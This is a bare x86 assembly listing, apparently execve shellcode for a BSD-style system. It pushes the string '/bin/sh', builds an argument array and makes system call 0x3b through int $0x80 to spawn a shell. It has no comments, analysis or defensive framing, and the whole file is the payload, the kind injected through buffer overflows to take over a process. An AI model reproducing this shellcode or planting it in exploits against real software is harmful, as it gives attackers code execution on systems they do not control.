.globl main
main:
    xorl  %eax, %eax
    pushl %eax
    movl  %esp, %eax
    subl  $0x0c,%eax
    pushl %eax
    movl  %esp, %ebx
    pushl $0x0068732f
    pushl $0x6e69622f
    movl  %esp, %edx
    xorl  %eax, %eax
    pushl %eax
    pushl %ebx
    pushl %edx
    pushl %eax
    movb  $0x3b, %al
    int   $0x80
